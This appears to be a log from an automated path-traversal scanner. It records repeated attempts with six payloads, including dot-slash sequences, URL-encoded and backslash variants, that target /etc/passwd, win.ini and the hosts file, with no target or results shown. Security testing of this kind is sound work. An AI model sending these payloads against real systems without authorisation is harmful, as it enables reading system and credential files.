2025-10-15 20:10:25,820 - PATH_TRAVERSAL - INFO - Testing: ../../../etc/passwd
2025-10-15 20:10:26,366 - PATH_TRAVERSAL - INFO - Testing: ../../../../windows/win.ini
2025-10-15 20:10:26,887 - PATH_TRAVERSAL - INFO - Testing: ....//....//....//etc/passwd
2025-10-15 20:10:27,419 - PATH_TRAVERSAL - INFO - Testing: %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
2025-10-15 20:10:27,945 - PATH_TRAVERSAL - INFO - Testing: ..\..\..\windows\system32\drivers\etc\hosts
2025-10-15 20:10:28,469 - PATH_TRAVERSAL - INFO - Testing: ....\....\....\windows\win.ini
2025-10-15 20:10:28,993 - PATH_TRAVERSAL - INFO - Testing: ../../../etc/passwd
2025-10-15 20:10:29,577 - PATH_TRAVERSAL - INFO - Testing: ../../../../windows/win.ini
2025-10-15 20:10:30,117 - PATH_TRAVERSAL - INFO - Testing: ....//....//....//etc/passwd
2025-10-15 20:10:30,664 - PATH_TRAVERSAL - INFO - Testing: %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
2025-10-15 20:10:31,217 - PATH_TRAVERSAL - INFO - Testing: ..\..\..\windows\system32\drivers\etc\hosts
2025-10-15 20:10:31,766 - PATH_TRAVERSAL - INFO - Testing: ....\....\....\windows\win.ini
2025-10-15 20:10:32,309 - PATH_TRAVERSAL - INFO - Testing: ../../../etc/passwd
2025-10-15 20:10:32,906 - PATH_TRAVERSAL - INFO - Testing: ../../../../windows/win.ini
2025-10-15 20:10:33,439 - PATH_TRAVERSAL - INFO - Testing: ....//....//....//etc/passwd
2025-10-15 20:10:33,976 - PATH_TRAVERSAL - INFO - Testing: %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
2025-10-15 20:10:34,506 - PATH_TRAVERSAL - INFO - Testing: ..\..\..\windows\system32\drivers\etc\hosts
2025-10-15 20:10:35,026 - PATH_TRAVERSAL - INFO - Testing: ....\....\....\windows\win.ini
2025-10-16 02:39:04,590 - PATH_TRAVERSAL - INFO - Testing: ../../../etc/passwd
2025-10-16 02:39:05,148 - PATH_TRAVERSAL - INFO - Testing: ../../../../windows/win.ini
2025-10-16 02:39:05,662 - PATH_TRAVERSAL - INFO - Testing: ....//....//....//etc/passwd
2025-10-16 02:39:06,189 - PATH_TRAVERSAL - INFO - Testing: %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
2025-10-16 02:39:06,739 - PATH_TRAVERSAL - INFO - Testing: ..\..\..\windows\system32\drivers\etc\hosts
2025-10-16 02:39:07,311 - PATH_TRAVERSAL - INFO - Testing: ....\....\....\windows\win.ini
2025-10-16 02:39:07,868 - PATH_TRAVERSAL - INFO - Testing: ../../../etc/passwd
2025-10-16 02:39:08,504 - PATH_TRAVERSAL - INFO - Testing: ../../../../windows/win.ini
2025-10-16 02:39:09,053 - PATH_TRAVERSAL - INFO - Testing: ....//....//....//etc/passwd
2025-10-16 02:39:09,708 - PATH_TRAVERSAL - INFO - Testing: %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
2025-10-16 02:39:10,351 - PATH_TRAVERSAL - INFO - Testing: ..\..\..\windows\system32\drivers\etc\hosts
2025-10-16 02:39:10,912 - PATH_TRAVERSAL - INFO - Testing: ....\....\....\windows\win.ini
2025-10-16 02:39:11,459 - PATH_TRAVERSAL - INFO - Testing: ../../../etc/passwd
2025-10-16 02:39:12,029 - PATH_TRAVERSAL - INFO - Testing: ../../../../windows/win.ini
2025-10-16 02:39:12,630 - PATH_TRAVERSAL - INFO - Testing: ....//....//....//etc/passwd
2025-10-16 02:39:13,193 - PATH_TRAVERSAL - INFO - Testing: %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
2025-10-16 02:39:13,726 - PATH_TRAVERSAL - INFO - Testing: ..\..\..\windows\system32\drivers\etc\hosts
2025-10-16 02:39:14,311 - PATH_TRAVERSAL - INFO - Testing: ....\....\....\windows\win.ini
